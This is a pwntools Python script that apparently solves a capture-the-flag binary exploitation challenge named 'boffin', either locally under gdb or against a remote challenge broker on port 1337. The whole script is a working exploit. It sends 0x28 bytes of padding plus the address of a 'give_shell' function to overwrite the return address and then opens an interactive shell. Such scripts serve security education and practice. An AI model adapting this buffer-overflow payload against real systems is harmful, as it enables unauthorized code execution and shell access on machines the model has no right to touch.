from pwn import *
local=False

context.log_level="DEBUG"
context.terminal=["tmux", "splitw", "-h", "-f"]
if local:
    p=gdb.debug("./boffin", '''
                            break main
                            continue
                            ''')
else:
    p=remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1337)
                        
e = ELF("./boffin")
jump_to_addr = e.symbols["give_shell"]

p.recvuntil(b"name?\n")
p.send(b"A"*0x28 + jump_to_addr.to_bytes(8, "little") + b"\n")
p.interactive()
